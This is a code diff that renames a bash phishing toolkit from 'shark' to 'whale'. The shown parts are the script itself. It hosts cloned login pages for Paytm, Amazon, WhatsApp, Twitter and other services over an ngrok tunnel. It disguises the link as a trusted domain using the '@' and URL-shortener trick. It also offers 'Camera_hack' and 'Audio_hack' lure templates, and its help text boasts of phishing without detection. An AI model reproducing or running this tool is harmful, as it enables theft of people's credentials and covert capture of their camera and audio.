@@ -2,9 +2,9 @@
 
 ##############################################
 #                                            #
-#             PROJECT: SHARK                 #
+#             PROJECT: whale                 #
 #             AUTHOR: ALBY                   #
-#              SHARK ©2020                   #
+#              whale ©2020                   #
 #     EMAIL: albinpraveen135790@gmail.com    #
 #           BEST PHISHING TOOLS              #              
 #       created by :- a l b y                #
@@ -99,40 +99,40 @@ function os () {
 	cat /etc/os-release > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then		
                 BIN="/usr/bin"
-	        phish="/usr/share/shark/phps"
+	        phish="/usr/share/whale/phps"
 		user_id="$(logname)"
 		if [ "${user_id}" = "root" ]; then 
 		         files="/root/Desktop"
 	        else
 		         files="/home/${user_id}/Desktop"
 	        fi
-		shark="/usr/share/shark"
-		old_shark="/usr/bin/shark"
+		whale="/usr/share/whale"
+		old_whale="/usr/bin/whale"
 		OS=DEBIAN
 		check_root
 	else
 		BIN="${PREFIX}/bin"
-		phish="${PREFIX}/share/shark/phps"
+		phish="${PREFIX}/share/whale/phps"
 		files="/sdcard"
-		shark="${PREFIX}/share/shark"
-                old_shark="${PREFIX}/bin/shark"
+		whale="${PREFIX}/share/whale"
+                old_whale="${PREFIX}/bin/whale"
 		OS=TERMUX
 	fi
 }
 
 
 function main_update() {
-	launch="updating shark"
-	splashdown="updated shark";echo
-	os;(wget -q https://github.com/ALBINPRAVEEN/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark) & spinner
+	launch="updating whale"
+	splashdown="updated whale";echo
+	os;(wget -q https://github.com/ALBINPRAVEEN/whale/raw/master/whale -O ${whale}/whale && rm -rf ${old_whale} && cp -rf ${whale}/whale $BIN && chmod 777 $BIN/whale) & spinner
 }
 
 
 function update() {
-	version=$(curl -L -s https://raw.githubusercontent.com/ALBINPRAVEEN/shark/master/shark | grep -w "VERSION=" | head -n1)
+	version=$(curl -L -s https://raw.githubusercontent.com/ALBINPRAVEEN/whale/master/whale | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
-		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
+		[ ${latest_version} != ${VERSION} ] && echo && msg "whale update is available !!" && sleep 2.5 && echo && msg "Run whale -u , whale --update" && echo && exit 1;	       
         fi
 }
 
@@ -159,13 +159,13 @@ function connection() {
 
 function check_update() {	
         connection
-        version=$(curl -L -s https://raw.githubusercontent.com/ALBINPRAVEEN/shark/master/shark | grep -w "VERSION=" | head -n1)
+        version=$(curl -L -s https://raw.githubusercontent.com/ALBINPRAVEEN/whale/master/whale | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then		
                 echo -e "\tReading \tpackage \tlists... \tDone
                          \tBuilding \tdependency \ttree       
                          \tReading \tstate \tinformation... \tDone
-                         \tshark \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
+                         \twhale \tis \talready \tthe \tnewest \tversion \t($VERSION)." | awk '{$1=$1};1'
 	        exit 1
 	else
 		main_update
@@ -180,39 +180,39 @@ function check_update() {
 usage() {
         cat <<EOF
 Usage: $(basename $0) [OPTIONS] available
-shark - future of phishing is here,
-A shark is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
+whale - future of phishing is here,
+A whale is a tool that will help you \do Phishing \in an advanced way so no one checks and identify that you are doing phishing.
 Copyright 2020 <albinpraveen135790@gmail.com>
 Options:
-  -u, --update      Update shark
-  -v, --version     Display the current shark version installed on your device
+  -u, --update      Update whale
+  -v, --version     Display the current whale version installed on your device
   -h, --help        Print this help message
-  -a, --assist      List detail discription of shark
-  -p, --purge       Uninstall shark
+  -a, --assist      List detail discription of whale
+  -p, --purge       Uninstall whale
   --fix-ngrok       Fix port forwarding issue 
   --fix-patches     Check missing packages & fix patches
   --fix-cloudshell  Restart Vm and cloudshell & fix patches
-For additional info, see: https://github.com/ALBINPRAVEEN/shark
+For additional info, see: https://github.com/ALBINPRAVEEN/whale
 EOF
 }
 
-function purge_shark() {	
+function purge_whale() {	
         os;printf "${red} Do you wish to delete camera and audio files too ? y/n : ";read ans && [ "$ans" != "${ans#[Yy]}" ];rm -rf ${files}/Camera_hack ${files}/Audio_hack
-        rm -rf ${shark} ${old_shark}
+        rm -rf ${whale} ${old_whale}
 }
 
 function fix_patches() {
-        launch="fixing shark patches"
-	splashdown="shark patches fixed";echo
-	os;sed -i -e 's/\r$//' ${shark}/setup
-	chmod 777 ${shark}/setup
-        (${shark}/setup > /dev/null 2&>1) & spinner
+        launch="fixing whale patches"
+	splashdown="whale patches fixed";echo
+	os;sed -i -e 's/\r$//' ${whale}/setup
+	chmod 777 ${whale}/setup
+        (${whale}/setup > /dev/null 2&>1) & spinner
 }
 
 function assist() {	
         #put manpage in man dir later
 	os
-        man ${shark}/manpage
+        man ${whale}/manpage
 }
 
 function fix_ngrok() {
@@ -234,7 +234,7 @@ function fix_ngrok() {
 }
 
 function fix_cloudshell() {
-	os;man ${shark}/cloudshell
+	os;man ${whale}/cloudshell
 }
 
 ###########
@@ -259,7 +259,7 @@ while true; do
                         ;;
 			
 		-p|--purge)
-		        purge_shark
+		        purge_whale
 			exit 1
 			;;
 
@@ -337,11 +337,11 @@ function url_shortner() {
 	# echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2
         short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
         shorter=${short#https://}       
-        read -p $'\n\033[1;92mshark \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
+        read -p $'\n\033[1;92mwhale \033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://facebook.com) :\e[0m ' mask
         url_checker $mask	
-	printf "${green}shark ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
-	printf "${green}shark ${white}>> ${white}Don't use space in your words\n"	
-        read -p $'\e[1;92mshark \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
+	printf "${green}whale ${white}>> ${white}Enter your key words ${yellow}: Ex. free-insta-followers\n"        
+	printf "${green}whale ${white}>> ${white}Don't use space in your words\n"	
+        read -p $'\e[1;92mwhale \033[1;97m>> \e[1;37mEnter your words here :\e[0m ' words
         final_url=$mask-$words@$shorter
 	printf "$final_url\n"
 }
@@ -349,7 +349,7 @@ function url_shortner() {
 
 # MAIN 
 function main() {
-        launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
+        launch="starting whale server";splashdown="started whale server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
 }
 
 #banner2
@@ -381,7 +381,7 @@ function credentials() {
 function paytm() {
           printf "\n${green}[${white}1${green}]${white} Sign In \n\n" 
           printf "${green}[${white}2${green}]${white} Sign Up \n\n"                           
-          read -p $'\e[1;92mshark \e[1;37m>> Enter Your Choice : \e[0m' option1			  
+          read -p $'\e[1;92mwhale \e[1;37m>> Enter Your Choice : \e[0m' option1			  
           if [ $option1 = 1 ] || [ $option1 = 01 ]; then	           
 		   cd paytm/ && main
 		   credentials
@@ -398,7 +398,7 @@ function camera_hack() {
         clear
         printf "\n\e[1;4;92mChoose Your Tempelates\e[0m\n\n"
         printf "${green}[${white}1${green}]${white} Diwali \n\n";printf "${green}[${white}2${green}]${white} Freindship Dare \n\n";printf "${green}[${white}3${green}]${white} Freindship Day \n\n";printf "${green}[${white}4${green}]${white} New Year \n\n";printf "${green}[${white}5${green}]${white} Jio Offfer \n\n"
-        read -p $'\e[1;92mshark\e[1;37m >>\e[0m ' page
+        read -p $'\e[1;92mwhale\e[1;37m >>\e[0m ' page
         link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         case $page in
 
@@ -501,7 +501,7 @@ function banner(){
         printf "\e[1;92m[\e[0m\e[1;37m09\e[0m\e[1;92m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;92m[\e[0m\e[1;37m20\e[0m\e[1;92m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;92m[\e[0m\e[1;37m31\e[0m\e[1;92m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m10\e[0m\e[1;92m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;92m[\e[0m\e[1;37m21\e[0m\e[1;92m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;92m[\e[0m\e[1;37m32\e[0m\e[1;92m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
         printf "\e[1;92m[\e[0m\e[1;37m11\e[0m\e[1;92m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;92m[\e[0m\e[1;37m22\e[0m\e[1;92m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;92m[\e[0m\e[1;37m99\e[0m\e[1;92m] \e[0m\e[1;91;102mExit\e[0m\n\n"
-        read -p $'\e[1;92mshark \e[1;97m>>\e[0m ' option
+        read -p $'\e[1;92mwhale \e[1;97m>>\e[0m ' option
 }
 
 
